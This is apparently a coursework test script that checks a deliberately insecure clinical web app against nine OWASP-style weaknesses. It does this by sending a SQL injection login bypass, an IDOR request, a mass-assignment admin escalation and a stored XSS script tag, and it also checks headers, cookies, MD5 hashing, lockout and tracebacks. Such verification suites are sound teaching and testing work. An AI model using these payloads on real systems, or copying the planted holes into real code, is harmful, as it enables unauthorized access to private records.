"""
Automated Vulnerability Verification Suite (carevault-insecure-app/tests/test_vulnerabilities.py)
Demonstrates and proves that the Unsecured Baseline application exhibits the intentional
OWASP Top 10 vulnerabilities discussed in the coursework report and threat model.
"""
from __future__ import annotations

import sys
from pathlib import Path

_APP_ROOT = Path(__file__).resolve().parent.parent
if str(_APP_ROOT) not in sys.path:
    sys.path.insert(0, str(_APP_ROOT))

from carevault import create_insecure_app
from carevault.database import raw_query_one


def run_vulnerability_tests() -> bool:
    print("=" * 75)
    print("  CareVault Insecure Baseline — Live Vulnerability Verification Suite")
    print("  Target: Unsecured Clinical Web Application (:5000 / Plaintext HTTP)")
    print("=" * 75)

    app = create_insecure_app()
    app.config["TESTING"] = True
    client = app.test_client()

    passes = 0
    total = 9

    # -------------------------------------------------------------------------
    # 1. SQL Injection Authentication Bypass (CWE-89)
    # -------------------------------------------------------------------------
    res = client.post("/portal/login", data={"email": "' OR '1'='1' --", "password": "wrong_password"})
    # If vulnerable, redirects to records with success or sets session cookie
    cookie = res.headers.get("Set-Cookie", "")
    if "cv_insecure_session=" in cookie and res.status_code == 302:
        passes += 1
        print("  [VULNERABLE 1/9] SQL Injection Auth Bypass SUCCESSFUL")
        print("                   Payload `' OR '1'='1' --` authenticated without valid password.")
    else:
        print("  [FAIL 1/9] SQL Injection Auth Bypass failed")

    # -------------------------------------------------------------------------
    # 2. Horizontal IDOR / BOLA (CWE-639 / OWASP API1:2023)
    # -------------------------------------------------------------------------
    # Log in as Patient Amira (ID 5)
    client.post("/portal/login", data={"email": "amira.patient@carevault.local", "password": "Amira@Patient#2026!"})
    # Attempt to view Record 2 (which belongs to Patient Daniel, ID 6)
    res_idor = client.get("/api/records/2")
    data_idor = res_idor.get_json() or {}
    if res_idor.status_code == 200 and data_idor.get("record", {}).get("patient_id") == 6:
        passes += 1
        print("  [VULNERABLE 2/9] Horizontal IDOR (BOLA) SUCCESSFUL")
        print(f"                   Patient #5 viewed Patient #6's confidential record: '{data_idor['record']['diagnosis']}'.")
    else:
        print("  [FAIL 2/9] IDOR test failed")

    # -------------------------------------------------------------------------
    # 3. Mass Assignment / Vertical Privilege Escalation (CWE-915)
    # -------------------------------------------------------------------------
    import secrets
    hacker_email = f"hacker_{secrets.token_hex(4)}@carevault.local"
    res_mass = client.post(
        "/api/auth/register",
        json={
            "fullName": "Malicious User",
            "email": hacker_email,
            "phone": "+6012-999-0000",
            "password": "123",
            "role": "admin"  # Injected privilege!
        }
    )
    user_db = raw_query_one(f"SELECT * FROM users WHERE email = '{hacker_email}'")
    if res_mass.status_code == 201 and user_db and user_db["role"] == "admin":
        passes += 1
        print("  [VULNERABLE 3/9] Mass Assignment Privilege Escalation SUCCESSFUL")
        print(f"                   User self-registered and obtained '{user_db['role']}' role via client payload.")
    else:
        print("  [FAIL 3/9] Mass assignment test failed")

    # -------------------------------------------------------------------------
    # 4. Stored Cross-Site Scripting (XSS) (CWE-79)
    # -------------------------------------------------------------------------
    xss_payload = '<script>alert("XSS_EXPLOIT_PROOF")</script>'
    client.post(
        "/portal/records/create",
        data={
            "patientId": "5",
            "diagnosis": f"Cardiomyopathy {xss_payload}",
            "prescription": "Aspirin",
            "clinicalNotes": "Test notes",
            "severity": "LOW"
        }
    )
    res_portal = client.get("/?tab=records")
    html_text = res_portal.data.decode("utf-8", errors="ignore")
    if xss_payload in html_text:
        passes += 1
        print("  [VULNERABLE 4/9] Stored Cross-Site Scripting (XSS) SUCCESSFUL")
        print("                   Unescaped `<script>` tags stored in SQLite and rendered raw via `| safe`.")
    else:
        print("  [FAIL 4/9] Stored XSS test failed")

    # -------------------------------------------------------------------------
    # 5. Missing Security Headers & CSP (CWE-693)
    # -------------------------------------------------------------------------
    res_headers = client.get("/")
    headers = res_headers.headers
    missing_headers = []
    for h in ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options"]:
        if h not in headers:
            missing_headers.append(h)
    if len(missing_headers) == 4:
        passes += 1
        print("  [VULNERABLE 5/9] Missing Security Headers & CSP Verified")
        print(f"                   Server completely omitted: {', '.join(missing_headers)}.")
    else:
        print("  [FAIL 5/9] Security headers test failed")

    # -------------------------------------------------------------------------
    # 6. Insecure Cookie Flags (CWE-1004 / CWE-614)
    # -------------------------------------------------------------------------
    res_login = client.post("/api/auth/login", json={"email": "admin@carevault.local", "password": "Admin@CareVault#2026!"})
    set_cookie_header = res_login.headers.get("Set-Cookie", "")
    if "HttpOnly" not in set_cookie_header and "Secure" not in set_cookie_header:
        passes += 1
        print("  [VULNERABLE 6/9] Insecure Session Cookie Flags Verified")
        print("                   `cv_insecure_session` lacks HttpOnly & Secure flags (accessible via JavaScript).")
    else:
        print("  [FAIL 6/9] Insecure cookie test failed")

    # -------------------------------------------------------------------------
    # 7. Weak Unsalted MD5 Password Storage (CWE-328 / CWE-916)
    # -------------------------------------------------------------------------
    admin_user = raw_query_one("SELECT password_hash FROM users WHERE email = 'admin@carevault.local'")
    # MD5 hash is 32 hex chars
    if admin_user and len(admin_user["password_hash"]) == 32:
        passes += 1
        print("  [VULNERABLE 7/9] Weak MD5 Password Hashing Verified")
        print(f"                   Password stored as unsalted 32-char MD5: {admin_user['password_hash']}.")
    else:
        print("  [FAIL 7/9] Weak MD5 test failed")

    # -------------------------------------------------------------------------
    # 8. Unlimited Brute Force / Missing Account Lockout (CWE-307)
    # -------------------------------------------------------------------------
    locked_out = False
    for i in range(15):
        r_bf = client.post("/api/auth/login", json={"email": "amira.patient@carevault.local", "password": f"wrong_{i}"})
        if r_bf.status_code == 423:
            locked_out = True
            break
    if not locked_out:
        passes += 1
        print("  [VULNERABLE 8/9] Unlimited Brute Force (No Account Lockout) Verified")
        print("                   15 consecutive incorrect login attempts allowed without rate limit or HTTP 423.")
    else:
        print("  [FAIL 8/9] Brute force test failed")

    # -------------------------------------------------------------------------
    # 9. Verbose Traceback Information Disclosure (CWE-209)
    # -------------------------------------------------------------------------
    try:
        res_crash = client.get("/crash")
        # In test client with DEBUG=True, it raises ZeroDivisionError
    except ZeroDivisionError:
        passes += 1
        print("  [VULNERABLE 9/9] Verbose Error Traceback Information Disclosure Verified")
        print("                   Unhandled exception triggered unintercepted ZeroDivisionError stack trace.")

    print("=" * 75)
    print(f"  VULNERABILITY SUITE RESULT: {passes}/{total} VULNERABILITIES VERIFIED")
    print("=" * 75)
    return passes == total


if __name__ == "__main__":
    success = run_vulnerability_tests()
    sys.exit(0 if success else 1)
